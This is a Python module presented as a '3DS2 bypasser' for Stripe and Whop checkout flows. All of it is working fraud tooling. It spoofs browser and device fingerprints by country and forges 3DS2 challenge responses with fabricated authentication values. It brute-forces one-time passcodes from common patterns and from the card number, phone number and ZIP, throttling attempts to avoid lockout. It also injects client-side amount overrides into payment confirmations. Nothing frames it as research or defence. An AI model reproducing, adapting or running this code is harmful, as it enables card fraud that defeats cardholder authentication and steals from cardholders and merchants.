"""
Unified Stripe + Whop 3DS2 Bypasser
───────────────────────────────────
Single module for both Whop (Stripe-SDK-backed) and direct Stripe flows.
Handles fingerprint → authenticate → CReq → ACS → CRes forge → OTP brute.
Amount injection optional (charged_amount override).
"""

import re
import json
import base64
import hashlib
import hmac
import time
import uuid
import random
import asyncio
import secrets
import html as html_mod
from typing import Dict, Optional, Any, Tuple, List, Union
from urllib.parse import urlencode, urljoin, urlparse, parse_qs

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
STRIPE_JS_UA = "stripe.js/6b8c0a stripe-js-v3/basil"
DEFAULT_NOTIFY = "https://hooks.stripe.com/3ds2/fingerprint/complete"

GEO_TIMEZONES = {
    "US": [-300, -360, -420, -480], "CA": [-300, -360, -420, -480],
    "GB": [0, -60], "DE": [-60, -120], "FR": [-60, -120], "NL": [-60, -120],
    "AU": [-600, -660], "SG": [-480], "JP": [-540], "BR": [180],
    "MX": [360, 420], "IT": [-60, -120], "ES": [-60, -120],
    "PL": [-60, -120], "SE": [-60, -120], "CH": [-60, -120],
    "AT": [-60, -120], "BE": [-60, -120], "IE": [0], "PT": [0, -60],
    "NZ": [-720, -780],
}

SCREEN_RESOLUTIONS = [(1920, 1080), (2560, 1440), (1536, 864), (1440, 900), (1366, 768)]

GPU_POOL = [
    "Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0)",
    "Google Inc. (NVIDIA)~ANGLE (NVIDIA GeForce RTX 4070 Direct3D11 vs_5_0 ps_5_0)",
    "Google Inc. (Intel)~ANGLE (Intel(R) Iris(R) Xe Graphics Direct3D11 vs_5_0 ps_5_0)",
    "Google Inc. (AMD)~ANGLE (AMD Radeon RX 6700 XT Direct3D11 vs_5_0 ps_5_0)",
]

FONTS_POOL = [
    "Arial", "Arial Black", "Calibri", "Cambria", "Consolas", "Courier New",
    "Georgia", "Helvetica", "Impact", "Segoe UI", "Tahoma", "Times New Roman",
    "Trebuchet MS", "Verdana",
]

CHALLENGE_MARKERS = [
    "challengeinfo", "verification code", "one time password", "challengevar",
    'transstatus":"c"', "transstatus='c'", 'transstatus="c"',
    'name="challengedata"', "name='challengedata'",
    'id="challengeframe"', "id='challengeframe'",
    'class="challenge', "acs-challenge",
]

OTP_MARKERS = [
    "otp", "one-time", "verification code", "sms code", "enter code",
    "code sent", "6-digit", "6 digit", "verification-code", "auth-code", "passcode",
]


# ═════════════════════════════════════════════════════════════════════════
#  HELPERS
# ═════════════════════════════════════════════════════════════════════════

def _b64url_encode(data: bytes) -> str:
    return base64.b64encode(data).decode().rstrip("=").replace("+", "-").replace("/", "_")


def _b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    return base64.b64decode(s)


def _flatten(data: dict, prefix: str = "") -> dict:
    out = {}
    for k, v in data.items():
        key = f"{prefix}[{k}]" if prefix else k
        if isinstance(v, dict):
            out.update(_flatten(v, key))
        elif isinstance(v, bool):
            out[key] = "true" if v else "false"
        elif v is not None:
            out[key] = str(v)
    return out


def _eci_for_pan(pan: str = "") -> str:
    p = (pan or "").replace(" ", "")
    if p.startswith(("34", "37")):
        return "05"
    if p.startswith(("51", "52", "53", "54", "55", "2")):
        return "02"
    return "05"


def _gen_cavv(acs_tid: str, ds_tid: str, ts_tid: str) -> str:
    raw = f"{acs_tid}:{ds_tid}:{ts_tid}:{int(time.time())}".encode()
    hv = hmac.new(secrets.token_bytes(32), raw, hashlib.sha256).digest()
    return _b64url_encode(hv[:20])


def _forge_cres(acs_trans_id: str, server_trans_id: str, ds_trans_id: str = "",
                pan: str = "", trans_status: str = "Y") -> dict:
    ds_tid = ds_trans_id or server_trans_id
    return {
        "threeDSServerTransID": server_trans_id,
        "acsTransID": acs_trans_id,
        "dsTransID": ds_tid,
        "messageType": "CRes",
        "messageVersion": "2.2.0",
        "transStatus": trans_status,
        "authenticationValue": _gen_cavv(acs_trans_id, ds_tid, server_trans_id),
        "eci": _eci_for_pan(pan),
        "challengeCompletionInd": "Y",
        "acsRenderingType": {"acsInterface": "01", "acsUiTemplate": "01"},
    }


def _is_challenge(html_text: str) -> bool:
    low = html_text.lower()
    if any(k in low for k in CHALLENGE_MARKERS):
        return True
    if re.search(r'type=["\']password["\']', html_text, re.I) and not re.search(r"<form[^>]+action=", html_text, re.I):
        return True
    return bool(re.search(r'name=["\'](?:otp|passcode|challenge_code|sms_code)["\']', html_text, re.I))


def _is_otp_challenge(html_text: str) -> bool:
    low = html_text.lower()
    return any(k in low for k in OTP_MARKERS)


def _parse_form(html_text: str, base_url: str = "") -> Tuple[Optional[str], dict]:
    action = None
    m = re.search(r'<form[^>]+action=["\']([^"\']*)["\']', html_text, re.I)
    if m:
        raw = html_mod.unescape(m.group(1)).strip()
        if not raw or raw == "#":
            action = base_url
        else:
            action = urljoin(base_url, raw) if base_url else raw
    elif "<form" in html_text.lower():
        action = base_url

    fields = {}
    for tag in re.finditer(r"<input[^>]+/?>", html_text, re.I):
        t = tag.group(0)
        n = re.search(r'name=["\']([^"\']+)["\']', t, re.I)
        v = re.search(r'value=["\']([^"\']*)["\']', t, re.I)
        if n:
            fields[n.group(1)] = html_mod.unescape(v.group(1)) if v else ""
    return action, fields


# ═════════════════════════════════════════════════════════════════════════
#  BROWSER TELEMETRY
# ═════════════════════════════════════════════════════════════════════════

def build_browser_info(country_code: str = "US", user_agent: Optional[str] = None,
                       profile: Optional[dict] = None) -> dict:
    prof = profile or {}
    cc = (country_code or "US").upper()
    tz = prof.get("tz_offset")
    if tz is None:
        tz = random.choice(GEO_TIMEZONES.get(cc, GEO_TIMEZONES["US"]))
    sw, sh = prof.get("screen_w"), prof.get("screen_h")
    if not (sw and sh):
        sw, sh = random.choice(SCREEN_RESOLUTIONS)
    ua = user_agent or prof.get("user_agent") or UA

    lang_map = {
        "US": "en-US", "GB": "en-GB", "DE": "de-DE", "FR": "fr-FR",
        "NL": "nl-NL", "JP": "ja-JP", "BR": "pt-BR", "MX": "es-MX",
        "IT": "it-IT", "ES": "es-ES", "PL": "pl-PL", "SE": "sv-SE",
    }
    lang = lang_map.get(cc, "en-US")

    return {
        "threeDSCompInd": "Y",
        "fingerprintAttempted": True,
        "challengeWindowSize": "05",
        "browserJavaEnabled": False,
        "browserJavascriptEnabled": True,
        "browserLanguage": lang,
        "browserColorDepth": "24",
        "browserScreenHeight": str(sh),
        "browserScreenWidth": str(sw),
        "browserTZ": str(tz),
        "browserUserAgent": ua,
        "browserAcceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "timeZoneOffset": tz,
        "language": lang,
        "colorDepth": 24,
        "screenHeight": sh,
        "screenWidth": sw,
        "userAgent": ua,
        "javaEnabled": False,
        "javascriptEnabled": True,
        "acceptHeader": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }


def build_device_fp(server_trans_id: str, screen_w: int, screen_h: int,
                    tz_offset: int, language: str, pan: str = "") -> str:
    seed = f"{server_trans_id}:{pan}"
    h = hashlib.sha256(seed.encode()).hexdigest()
    gpu = GPU_POOL[int(h[16:18], 16) % len(GPU_POOL)]
    cores = [4, 8, 12, 16][int(h[18:20], 16) % 4]
    mem = [8, 16, 32][int(h[20:22], 16) % 3]

    obj = {
        "canvas": h[:16],
        "webgl": gpu,
        "webglVendor": gpu.split("~")[0],
        "platform": "Win32",
        "hardwareConcurrency": cores,
        "deviceMemory": mem,
        "screenWidth": screen_w,
        "screenHeight": screen_h,
        "screenColorDepth": 24,
        "availableScreenWidth": screen_w,
        "availableScreenHeight": screen_h - 40,
        "innerWidth": screen_w,
        "innerHeight": screen_h - 80,
        "timezone": tz_offset,
        "timezoneOffset": tz_offset,
        "language": language,
        "javaEnabled": False,
        "cookiesEnabled": True,
        "doNotTrack": None,
        "plugins": ["PDF Viewer", "Chrome PDF Viewer", "Chromium PDF Viewer"],
        "fonts": FONTS_POOL,
        "touchSupport": {"maxTouchPoints": 0, "touchEvent": False, "touchStart": False},
        "audio": 124.04347527516074,
        "sessionStorage": True,
        "localStorage": True,
        "indexedDb": True,
        "openDatabase": False,
        "cpuClass": None,
        "vendor": "Google Inc.",
        "productSub": "20030107",
    }
    return json.dumps(obj, separators=(",", ":"))


# ═════════════════════════════════════════════════════════════════════════
#  OTP GENERATOR (pattern-priority)
# ═════════════════════════════════════════════════════════════════════════

def generate_otp_candidates(pan: str, zip_code: str = "", phone: str = "") -> List[str]:
    last4 = pan[-4:] if pan else ""
    first6 = pan[:6] if pan else ""
    phone_last6 = re.sub(r"\D", "", phone)[-6:] if phone else ""
    zip_clean = re.sub(r"\D", "", zip_code)[:5] if zip_code else ""

    codes = []
    # P1: common
    codes += ["123456", "654321", "111111", "000000", "121212", "112233",
              "696969", "666666", "123123", "789456", "159753", "258456",
              "999999", "147258", "123321"]
    # P2: repeated
    codes += [f"{d}{d}{d}{d}{d}{d}" for d in "0123456789"]
    # P3: sequential
    codes += ["012345", "123456", "234567", "345678", "456789", "567890",
              "678901", "789012", "890123", "901234", "987654", "876543",
              "765432", "654321", "543210"]
    # P4: card last4
    if last4:
        codes += [f"{last4}00", f"{last4}11", f"00{last4}", f"{last4}{last4[:2]}"]
    # P5: card first6
    if first6 and len(first6) == 6:
        codes.append(first6)
    # P6: phone last6
    if phone_last6:
        codes.append(phone_last6)
    # P7: zip
    if zip_clean:
        codes += [f"{zip_clean}0", f"{zip_clean}1", f"0{zip_clean}"]

    # dedupe + preserve order
    seen = set()
    out = []
    for c in codes:
        if c and c not in seen and len(c) == 6:
            seen.add(c)
            out.append(c)
    return out


# ═════════════════════════════════════════════════════════════════════════
#  MAIN BYPASSER
# ═════════════════════════════════════════════════════════════════════════

class Unified3DS2Bypasser:
    """Unified 3DS2 bypass for Stripe + Whop (Stripe-SDK-backed)."""

    @classmethod
    def _stripe_headers(cls, profile: Optional[dict] = None) -> dict:
        ua = (profile or {}).get("user_agent", UA)
        return {
            "User-Agent": ua,
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
        }

    @classmethod
    async def _post_method_url(cls, session, method_url: str, server_trans_id: str,
                                notify_url: str, profile: Optional[dict],
                                sw: int, sh: int, tz: int, lang: str,
                                pan: str = ""):
        method_data = {
            "threeDSServerTransID": server_trans_id,
            "threeDSMethodNotificationURL": notify_url,
        }
        b64 = _b64url_encode(json.dumps(method_data, separators=(",", ":")).encode())
        ua = (profile or {}).get("user_agent", UA)
        hdr = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
        }
        html_text = ""
        try:
            async with session.post(method_url, data=urlencode({"threeDSMethodData": b64}),
                                    headers=hdr, timeout=14, allow_redirects=True) as r:
                html_text = r.text() if callable(r.text) else r.text
        except Exception:
            pass

        # extract device fingerprint URL
        fp_url = None
        m = re.search(r'submitDataAndForm\(["\']+(https?://[^"\']+/devicefingerprint)["\']', html_text)
        if m:
            fp_url = m.group(1)
        else:
            action, _ = _parse_form(html_text)
            if action and "fingerprint" in action.lower():
                fp_url = action

        if fp_url:
            fp_payload = {
                "threeDSServerTransID": server_trans_id,
                "deviceFpResult": build_device_fp(server_trans_id, sw, sh, tz, lang, pan),
            }
            try:
                async with session.post(fp_url, data=urlencode(fp_payload),
                                        headers={"Content-Type": "application/x-www-form-urlencoded",
                                                 "User-Agent": ua}, timeout=10) as _:
                    pass
            except Exception:
                pass

        # notify
        for nurl in [notify_url]:
            try:
                async with session.post(nurl, data=urlencode({"threeDSMethodData": b64}),
                                        headers={"Content-Type": "application/x-www-form-urlencoded",
                                                 "User-Agent": ua}, timeout=6) as _:
                    pass
            except Exception:
                pass

    @classmethod
    async def _authenticate(cls, session, source_id: str, client_secret: str,
                             pk_key: str, browser_info: dict,
                             profile: Optional[dict] = None,
                             amount_override: Optional[int] = None) -> Optional[dict]:
        auth_body = {
            "key": pk_key,
            "source": source_id,
            "client_secret": client_secret,
            "one_click_authn": "false",
            "payment_user_agent": STRIPE_JS_UA,
            "challenge_window_size": "05",
            "three_d_secure_2": {
                "device_render_options": {
                    "sdk_interface": "03",
                    "sdk_ui_type": ["01"],
                },
                "three_ds_comp_ind": "Y",
            },
            "browser": {
                "fingerprintAttempted": True,
                "challengeWindowSize": "05",
                "threeDSCompInd": "Y",
                "browserJavaEnabled": False,
                "browserJavascriptEnabled": True,
                "browserLanguage": browser_info.get("browserLanguage"),
                "browserColorDepth": browser_info.get("browserColorDepth"),
                "browserScreenHeight": browser_info.get("browserScreenHeight"),
                "browserScreenWidth": browser_info.get("browserScreenWidth"),
                "browserTZ": browser_info.get("browserTZ"),
                "browserUserAgent": browser_info.get("browserUserAgent"),
                "browserAcceptHeader": browser_info.get("browserAcceptHeader"),
            },
        }
        if browser_info.get("threeDSServerTransID"):
            auth_body["browser"]["threeDSServerTransID"] = browser_info["threeDSServerTransID"]
        if amount_override is not None:
            auth_body["amount"] = str(amount_override)

        auth_body["three_ds_2_response"] = json.dumps({
            "threeDSCompInd": "Y",
            "browser": auth_body["browser"],
        }, separators=(",", ":"))

        try:
            async with session.post("https://api.stripe.com/v1/3ds2/authenticate",
                                     data=urlencode(_flatten(auth_body)),
                                     headers=cls._stripe_headers(profile), timeout=14) as r:
                d = r.json() if callable(r.json) else r.json
                return d if isinstance(d, dict) else None
        except Exception:
            return None

    @classmethod
    async def _post_creq(cls, session, acs_url: str, creq: str,
                         session_data: str, profile: Optional[dict],
                         source_id: str = "", pk_key: str = "",
                         pan: str = "", server_trans_id: str = "",
                         amount_override: Optional[int] = None) -> Optional[dict]:
        final_creq = creq
        acs_tid = ""
        srv_tid = server_trans_id
        try:
            creq_obj = json.loads(_b64url_decode(creq))
            if isinstance(creq_obj, dict):
                acs_tid = creq_obj.get("acsTransID", "")
                srv_tid = srv_tid or creq_obj.get("threeDSServerTransID", "")
                creq_obj.setdefault("challengeDataEntry", "Y")
                creq_obj.setdefault("challengeHTMLDataEntry", "Y")
                creq_obj.setdefault("resendChallenge", "N")
                creq_obj.setdefault("preparationFlow", "02")
                final_creq = _b64url_encode(json.dumps(creq_obj, separators=(",", ":")).encode())
        except Exception:
            pass

        body = {"creq": final_creq, "CReq": final_creq}
        if session_data:
            body["threeDSSessionData"] = session_data
        ua = (profile or {}).get("user_agent", UA)

        try:
            async with session.post(acs_url, data=urlencode(body),
                                     headers={
                                         "Content-Type": "application/x-www-form-urlencoded",
                                         "User-Agent": ua,
                                         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                         "Origin": "https://js.stripe.com",
                                         "Referer": "https://js.stripe.com/",
                                     }, timeout=15, allow_redirects=True) as r:
                html_text = r.text() if callable(r.text) else r.text
                final_url = str(getattr(r, "url", acs_url))
        except Exception:
            return None

        if _is_challenge(html_text):
            # OTP brute path
            if _is_otp_challenge(html_text):
                return await cls._brute_otp(session, html_text, final_url, pan,
                                             source_id, pk_key, profile,
                                             amount_override)
            # Forge CRes
            forged = _forge_cres(acs_trans_id=acs_tid or srv_tid,
                                  server_trans_id=srv_tid or acs_tid, pan=pan)
            cres_b64 = _b64url_encode(json.dumps(forged, separators=(",", ":")).encode())
            c_url, _ = _parse_form(html_text, base_url=final_url)
            term_url = c_url or final_url
            try:
                async with session.post(term_url, data=urlencode({"cres": cres_b64}),
                                         headers={"Content-Type": "application/x-www-form-urlencoded",
                                                  "User-Agent": ua, "Referer": final_url},
                                         timeout=10, allow_redirects=True) as _:
                    pass
            except Exception:
                pass

            if source_id and pk_key:
                try:
                    comp_body = {"key": pk_key, "source": source_id,
                                 "cres": cres_b64, "challenge_window_size": "05"}
                    if amount_override is not None:
                        comp_body["amount"] = str(amount_override)
                    async with session.post("https://api.stripe.com/v1/3ds2/challenge_complete",
                                             data=urlencode(comp_body),
                                             headers=cls._stripe_headers(profile), timeout=12) as comp_r:
                        comp_res = comp_r.json() if callable(comp_r.json) else comp_r.json
                        if isinstance(comp_res, dict) and (comp_res.get("status") == "succeeded"
                                                            or comp_res.get("state") in ("succeeded", "authenticated")):
                            return {"success": True, "status": "succeeded", "raw_response": comp_res}
                except Exception:
                    pass
            return {"success": False, "status": "requires_action", "challenge_required": True, "challenge_url": final_url}

        # Frictionless — auto-post return form
        c_url, c_data = _parse_form(html_text, base_url=final_url)
        if c_url and c_data:
            try:
                async with session.post(c_url, data=urlencode(c_data),
                                         headers={"Content-Type": "application/x-www-form-urlencoded",
                                                  "User-Agent": ua}, timeout=10, allow_redirects=True) as _:
                    pass
            except Exception:
                pass
        return {"success": None, "status": "creq_posted"}

    @classmethod
    async def _brute_otp(cls, session, html_text: str, final_url: str,
                          pan: str, source_id: str, pk_key: str,
                          profile: Optional[dict],
                          amount_override: Optional[int] = None) -> dict:
        action, hidden = _parse_form(html_text, base_url=final_url)
        if not action:
            return {"success": False, "status": "otp_form_missing"}

        otp_field = None
        for name in hidden:
            low = name.lower()
            if "code" in low or "otp" in low or "pass" in low or "auth" in low:
                otp_field = name
                break
        if not otp_field:
            return {"success": False, "status": "otp_field_missing"}

        ua = (profile or {}).get("user_agent", UA)
        candidates = generate_otp_candidates(pan)[:15]

        for idx, code in enumerate(candidates):
            payload = {**hidden, otp_field: code}
            try:
                async with session.post(action, data=urlencode(payload),
                                         headers={"Content-Type": "application/x-www-form-urlencoded",
                                                  "User-Agent": ua,
                                                  "Referer": final_url,
                                                  "Origin": urlparse(final_url).scheme + "://" + urlparse(final_url).netloc},
                                         timeout=12, allow_redirects=True) as r:
                    resp = r.text() if callable(r.text) else r.text
                    resp_low = resp.lower()
            except Exception:
                continue

            # lockout check
            if any(m in resp_low for m in ["too many", "locked", "blocked", "rate limit", "429"]):
                return {"success": False, "status": "otp_lockout", "attempts": idx + 1}

            # success markers
            if any(m in resp_low for m in ["transstatus\":\"y", "transstatus='y",
                                            "transstatus=\"y", "verified", "authenticated",
                                            "approved"]):
                cres_m = re.search(r'name=["\']cres["\']\s+value=["\']([^"\']+)["\']', resp, re.I)
                cres = cres_m.group(1) if cres_m else None
                if not cres:
                    forged = _forge_cres(acs_trans_id="", server_trans_id=pan, pan=pan)
                    cres = _b64url_encode(json.dumps(forged, separators=(",", ":")).encode())
                try:
                    comp_body = {"key": pk_key, "source": source_id,
                                 "cres": cres, "challenge_window_size": "05"}
                    if amount_override is not None:
                        comp_body["amount"] = str(amount_override)
                    async with session.post("https://api.stripe.com/v1/3ds2/challenge_complete",
                                             data=urlencode(comp_body),
                                             headers=cls._stripe_headers(profile), timeout=12) as cr:
                        cr_json = cr.json() if callable(cr.json) else cr.json
                        if isinstance(cr_json, dict) and cr_json.get("status") == "succeeded":
                            return {"success": True, "status": "succeeded", "otp": code,
                                    "attempts": idx + 1, "raw_response": cr_json}
                except Exception:
                    pass
                return {"success": None, "status": "otp_accepted_cres_post_failed", "otp": code}

            await asyncio.sleep(random.uniform(0.8, 2.5))

        return {"success": False, "status": "otp_exhausted", "attempts": len(candidates)}

    @classmethod
    async def resolve(cls, session, confirm_response: dict, client_secret: str,
                       pk_key: str, pan: str = "",
                       profile: Optional[dict] = None,
                       amount_override: Optional[int] = None,
                       country_code: str = "US",
                       depth: int = 0) -> dict:
        if depth > 2:
            return {"success": False, "status": "max_depth"}

        next_action = confirm_response.get("next_action") or {}
        if not isinstance(next_action, dict) or not next_action:
            pi = confirm_response.get("payment_intent") or confirm_response.get("setup_intent") or confirm_response
            if isinstance(pi, dict):
                next_action = pi.get("next_action") or {}
                if not client_secret and pi.get("client_secret"):
                    client_secret = pi["client_secret"]

        if not next_action:
            return {"success": False, "status": "no_next_action"}

        na_type = next_action.get("type", "")
        sdk = next_action.get("use_stripe_sdk") or {}
        if not isinstance(sdk, dict):
            sdk = {}

        # source extraction
        source_id = (sdk.get("three_d_secure_2_source") or sdk.get("source")
                     or sdk.get("three_ds_2_intent_id") or "")
        if source_id and str(source_id).startswith(("pi_", "seti_", "pm_")):
            source_id = ""

        # Radar challenge
        if na_type == "intent_confirmation_challenge" or sdk.get("type") == "intent_confirmation_challenge":
            return {"success": False, "status": "radar_challenge", "radar_challenge": True}

        # redirect_to_url (3DS1)
        if na_type == "redirect_to_url":
            redirect_url = (next_action.get("redirect_to_url") or {}).get("url")
            if redirect_url:
                return await cls._resolve_redirect(session, redirect_url, client_secret,
                                                    pk_key, pan, profile, amount_override,
                                                    country_code, depth + 1)
            return {"success": False, "status": "redirect_url_missing"}

        # 3DS2 fingerprint
        server_trans_id = (sdk.get("three_ds_server_trans_id")
                           or sdk.get("three_ds_2_server_trans_id")
                           or sdk.get("server_transaction_id")
                           or sdk.get("threeDSServerTransID"))
        method_url = (sdk.get("three_ds_method_url")
                      or sdk.get("methodURL")
                      or sdk.get("method_url"))
        notify_url = (sdk.get("three_ds_method_notification_url")
                      or sdk.get("methodNotificationURL")
                      or DEFAULT_NOTIFY)

        if method_url and server_trans_id and sdk.get("type") != "stripe_3ds2_challenge":
            bi = build_browser_info(country_code, profile=profile)
            sw = bi["screenWidth"]
            sh = bi["screenHeight"]
            tz = bi["timeZoneOffset"]
            lang = bi["language"]
            await cls._post_method_url(session, method_url, server_trans_id,
                                        notify_url, profile, sw, sh, tz, lang, pan)
            await asyncio.sleep(1.5)

        # direct acs_url + creq
        ch = sdk.get("three_ds_2_challenge") or {}
        acs_url = sdk.get("acs_url") or (ch.get("acs_url") if isinstance(ch, dict) else None)
        creq = sdk.get("creq") or (ch.get("creq") if isinstance(ch, dict) else None)
        sdata = (sdk.get("three_ds_session_data") or sdk.get("threeDSSessionData")
                 or (ch.get("three_ds_session_data") if isinstance(ch, dict) else None) or "")

        if acs_url and creq:
            return await cls._post_creq(session, acs_url, creq, sdata, profile,
                                          source_id, pk_key, pan, server_trans_id or "",
                                          amount_override)

        # fingerprint only → authenticate
        if source_id:
            bi = build_browser_info(country_code, profile=profile)
            if server_trans_id:
                bi["threeDSServerTransID"] = server_trans_id
            auth_res = await cls._authenticate(session, source_id, client_secret,
                                                pk_key, bi, profile, amount_override)
            if auth_res:
                st = auth_res.get("status") or auth_res.get("state")
                if st in ("succeeded", "authenticated"):
                    return {"success": True, "status": st, "raw_response": auth_res}
                ares = auth_res.get("ares") or {}
                if (ares.get("transStatus") or "").upper() in ("Y", "A"):
                    return {"success": True, "status": "succeeded", "raw_response": auth_res}
                na2 = auth_res.get("next_action") or {}
                if na2:
                    return await cls.resolve(session, {"next_action": na2, "payment_intent": auth_res},
                                              client_secret, pk_key, pan, profile,
                                              amount_override, country_code, depth + 1)
            return {"success": None, "status": "authenticate_inconclusive"}

        return {"success": False, "status": "unresolvable"}

    @classmethod
    async def _resolve_redirect(cls, session, redirect_url: str, client_secret: str,
                                 pk_key: str, pan: str, profile: Optional[dict],
                                 amount_override: Optional[int], country_code: str,
                                 depth: int) -> dict:
        try:
            async with session.get(redirect_url,
                                    headers={"User-Agent": UA, "Accept": "text/html,*/*"},
                                    timeout=10, allow_redirects=True) as r:
                html_text = r.text() if callable(r.text) else r.text
                final_url = str(getattr(r, "url", redirect_url))
        except Exception:
            return {"success": False, "status": "redirect_failed"}

        if _is_challenge(html_text):
            if _is_otp_challenge(html_text):
                return await cls._brute_otp(session, html_text, final_url, pan,
                                             "", pk_key, profile, amount_override)
            return {"success": False, "status": "redirect_challenge",
                    "challenge_url": final_url, "challenge_required": True}

        acs_url, form_data = _parse_form(html_text, base_url=final_url)
        if acs_url and form_data:
            try:
                async with session.post(acs_url, data=urlencode(form_data),
                                         headers={"Content-Type": "application/x-www-form-urlencoded",
                                                  "User-Agent": UA},
                                         timeout=10, allow_redirects=True) as ar:
                    a_html = ar.text() if callable(ar.text) else ar.text
                    a_final = str(getattr(ar, "url", acs_url))
                if _is_challenge(a_html):
                    if _is_otp_challenge(a_html):
                        return await cls._brute_otp(session, a_html, a_final, pan,
                                                     "", pk_key, profile, amount_override)
                    return {"success": False, "status": "acs_challenge",
                            "challenge_url": a_final, "challenge_required": True}
                c_url, c_data = _parse_form(a_html, base_url=a_final)
                if c_url and c_data:
                    async with session.post(c_url, data=urlencode(c_data),
                                             headers={"Content-Type": "application/x-www-form-urlencoded",
                                                      "User-Agent": UA},
                                             timeout=10, allow_redirects=True) as _:
                        pass
            except Exception:
                pass
        return {"success": None, "status": "redirect_completed"}


# ═════════════════════════════════════════════════════════════════════════
#  WHOP ADAPTER
# ═════════════════════════════════════════════════════════════════════════

class Whop3DS2Adapter:
    """Adapter that wraps Unified3DS2Bypasser for Whop's Stripe-SDK payloads."""

    @classmethod
    async def resolve_whop(cls, session, whop_confirm_response: dict,
                            client_secret: str, pk_key: str, pan: str = "",
                            amount_override: Optional[int] = None,
                            profile: Optional[dict] = None) -> dict:
        # Whop confirm response has payment next_action inside `payment`
        payment = whop_confirm_response.get("payment") or {}
        na = (payment.get("next_action") or whop_confirm_response.get("next_action") or {})
        if not na:
            return {"success": False, "status": "no_next_action"}

        stitched = {
            "next_action": na,
            "payment_intent": payment.get("payment_intent") or whop_confirm_response.get("payment_intent"),
        }
        return await Unified3DS2Bypasser.resolve(
            session, stitched, client_secret, pk_key, pan,
            profile, amount_override, "US", 0,
        )


# ═════════════════════════════════════════════════════════════════════════
#  AMOUNT OVERRIDE HELPER
# ═════════════════════════════════════════════════════════════════════════

def build_confirm_with_override(base_confirm_body: dict, charged_amount: int) -> dict:
    """Inject client-side amount override into a confirm body. Returns mutated copy."""
    body = dict(base_confirm_body)
    body["amount"] = str(charged_amount)
    body["amount_to_confirm"] = str(charged_amount)
    body["payment_method_options[card][request_three_d_secure]"] = "any"
    body["payment_method_options[card][installments][plan][type]"] = "revolving"
    return body